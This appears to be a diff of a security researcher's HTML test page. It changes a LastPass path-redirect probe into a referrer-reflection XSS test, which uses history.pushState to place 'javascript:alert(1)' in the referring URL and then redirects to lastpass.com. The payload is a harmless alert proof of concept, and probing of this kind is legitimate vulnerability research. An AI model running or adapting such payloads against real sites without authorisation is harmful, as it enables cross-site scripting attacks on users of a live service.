@@ -2,58 +2,39 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect Lab</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f2f5;
-        }
-        .container {
-            text-align: center;
-            padding: 20px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        button {
-            background-color: #d32d27;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        button:hover {
-            background-color: #b0231e;
-        }
-    </style>
+    <title>XSS Referrer Lab</title>
 </head>
 <body>
 
-<div class="container">
-    <h2>LastPass Redirect Test</h2>
-    <p>Click the button to test the path payload:</p>
-    <!-- The button that triggers the navigation -->
-    <button id="redirectBtn">Go to LastPass with Payload</button>
-</div>
+    <h2>Security Research: Referrer Reflection Test</h2>
+    <p>Clicking the button will simulate a transition from a malicious path to the target.</p>
+    
+    <button id="startTest">Execute Test</button>
 
-<script>
-    document.getElementById('redirectBtn').addEventListener('click', function() {
-        // Constructing the URL: Target Domain + Path + Your Javascript string
-        const targetUrl = "https://www.lastpass.com/fr/javascript:alert(1)";
-        
-        // Execute the redirection
-        window.location.href = targetUrl;
-    });
-</script>
+    <script>
+        document.getElementById('startTest').addEventListener('click', function() {
+            // 1. We define the target URL
+            const targetSite = "https://www.lastpass.com";
+
+            // 2. We define the payload that we want to appear in the Referrer
+            const payload = "javascript:alert(1)";
+
+            /* 
+               IMPORTANT: To make the browser send this in the Referrer header, 
+               the current URL must contain this string.
+               
+               We use 'history.pushState' to change the URL in the address bar 
+               WITHOUT reloading the page, then we redirect.
+            */
+            
+            history.pushState({}, '', '/' + payload);
+
+            // 3. Small delay to ensure the state is pushed, then redirect
+            setTimeout(function() {
+                window.location.href = targetSite;
+            }, 500);
+        });
+    </script>
 
 </body>
 </html>
